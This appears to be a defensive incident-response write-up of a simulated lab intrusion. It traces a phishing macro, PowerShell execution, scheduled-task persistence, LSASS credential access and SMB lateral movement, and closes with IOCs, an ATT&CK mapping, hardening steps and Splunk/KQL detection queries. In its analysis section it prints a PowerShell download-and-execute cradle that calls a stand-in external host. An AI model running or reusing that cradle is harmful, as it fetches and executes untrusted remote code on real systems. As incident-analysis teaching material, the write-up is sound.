> **Lab scenario.** This write-up uses a simulated intrusion built in a home lab with synthetic data. Hostnames, users and addresses are invented (IPs come from documentation ranges). It shows my method and report structure. It is not a real incident and contains no employer data.

## 1. Executive summary

A user in the lab domain opened a macro-enabled Word attachment from a phishing email. The macro launched PowerShell, which downloaded a second-stage payload, created persistence through a scheduled task, dumped credentials from memory, and moved laterally to a file server over SMB using a harvested account.

**Impact:** one workstation and one server compromised, one domain user credential exposed, no evidence of data exfiltration in the available logs.
**Status:** contained. Both hosts isolated, credentials reset, malicious artifacts removed.
**Confidence:** high for initial access and persistence (multiple corroborating artifacts), medium for credential access (inferred from process access events and the follow-on logon).

## 2. Scope and evidence

| Source | Collected with | Notes |
|---|---|---|
| WS-014 triage image | KAPE (`!SANS_Triage`) | Registry hives, event logs, Prefetch, MFT, Amcache |
| WS-014 memory | Live capture before isolation | Volatility 3 analysis |
| FS-02 event logs | Exported EVTX | Security, System, Sysmon |
| Mail gateway log | Export | Delivery and attachment metadata |
| Firewall / proxy log | Export | Outbound connections from WS-014 |

Evidence handling: hashes recorded at acquisition, working copies analysed read-only, chain-of-custody sheet kept.

## 3. Timeline (UTC, simulated)

| Time | Host | Event | Source artifact |
|---|---|---|---|
| 09:12:04 | Mail GW | Message with `Invoice_4471.docm` delivered to user `jdoe` | Mail log |
| 09:14:31 | WS-014 | `WINWORD.EXE` opens the attachment from the Outlook temp cache | Sysmon 1, UserAssist |
| 09:14:40 | WS-014 | `WINWORD.EXE` spawns `powershell.exe -nop -w hidden -enc ...` | Sysmon 1, Security 4688 |
| 09:14:42 | WS-014 | PowerShell connects to `203.0.113.45:443` | Sysmon 3, proxy log |
| 09:14:55 | WS-014 | `update.exe` written to `C:\Users\jdoe\AppData\Roaming\` | Sysmon 11, MFT |
| 09:15:20 | WS-014 | Scheduled task `OneDrive Sync Check` created | Security 4698, Task XML |
| 09:41:12 | WS-014 | Process opens a handle to `lsass.exe` with `0x1010` access | Sysmon 10 |
| 10:03:47 | FS-02 | Network logon (type 3) by `svc-backup` from WS-014 | Security 4624, 4672 |
| 10:04:10 | FS-02 | Service `WinSyncSvc` installed | System 7045 |
| 10:05:33 | WS-014 | Outbound traffic stops after isolation | Firewall log |

## 4. Analysis

### 4.1 Initial access (T1566.001)
The mail log shows one delivery of a `.docm` file to the user. The sender domain was registered days before delivery and failed DMARC alignment. Word's Most Recently Used list and the Outlook secure temp folder confirm the user opened the file.

### 4.2 Execution (T1204.002, T1059.001)
Word launching PowerShell is a high-fidelity detection on its own. The encoded command decoded to a download cradle:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.45/a')
```

Script Block Logging (Event 4104) captured the decoded content, which is why enabling it matters.

### 4.3 Persistence (T1053.005)
Security Event 4698 recorded a scheduled task running `update.exe` at logon. The task name imitates a legitimate cloud sync product. Two checks that separate it from real software:
- The binary sits in `AppData\Roaming`, not `Program Files`.
- It is unsigned and has no matching Amcache install entry.

### 4.4 Credential access (T1003.001)
Sysmon Event 10 shows a process requesting `PROCESS_VM_READ` on `lsass.exe`. Memory analysis found the injected process holding a credential-dumping module. I rate this medium confidence: the dump file itself was deleted, so the evidence is the access event plus the next step.

### 4.5 Lateral movement (T1021.002, T1569.002)
A type 3 logon to FS-02 by `svc-backup` from WS-014 came 22 minutes later. That account had never authenticated from a workstation before, which stands out against its baseline. A service was then installed on FS-02 with its binary in a writable path.

## 5. Indicators of compromise (synthetic)

| Type | Value |
|---|---|
| Domain | `invoices-portal[.]example` |
| IP | `203.0.113[.]45` |
| File | `Invoice_4471.docm` |
| File | `%APPDATA%\update.exe` |
| Scheduled task | `OneDrive Sync Check` |
| Service | `WinSyncSvc` |

Paste these into the [IOC checker](intel.html) to see the pivot workflow.

## 6. MITRE ATT&CK mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1566.001 Spearphishing Attachment |
| Execution | T1204.002 User Execution, T1059.001 PowerShell |
| Persistence | T1053.005 Scheduled Task, T1543.003 Windows Service |
| Credential Access | T1003.001 LSASS Memory |
| Lateral Movement | T1021.002 SMB/Admin Shares |
| Defense Evasion | T1027 Obfuscated Files or Information |

## 7. Containment and recommendations

**Immediate**
1. Isolate WS-014 and FS-02; reset `jdoe` and `svc-backup`; revoke active sessions and Kerberos tickets.
2. Block the domain and IP at the proxy and firewall; search mail for the same sender and attachment.
3. Remove the scheduled task, service and dropped binaries after imaging.

**Hardening**
- Block Office macros from the internet via Group Policy.
- Enable Attack Surface Reduction rules (block Office child processes, block credential stealing from LSASS) and LSA protection.
- Restrict service accounts from interactive and workstation-origin logons; tier administrative accounts.
- Alert on Office → PowerShell process chains and on new services in user-writable paths.

## 8. Detection query examples

**Splunk (Sysmon):**
```
index=sysmon EventCode=1 ParentImage="*\\WINWORD.EXE" Image IN ("*\\powershell.exe","*\\cmd.exe","*\\wscript.exe")
| stats count min(_time) as first by host, user, CommandLine
```

**Sentinel (KQL):**
```
SecurityEvent
| where EventID == 4698
| extend Task = tostring(EventData)
| where Task has_any ("AppData", "Temp", "-enc")
| project TimeGenerated, Computer, SubjectUserName, Task
```

## 9. Lessons learned

- Parent-child process relationships caught this earlier than any single IOC would have.
- Memory capture before isolation preserved evidence the disk did not hold.
- A service account's first workstation logon was the strongest lateral movement signal, so baselines pay off.
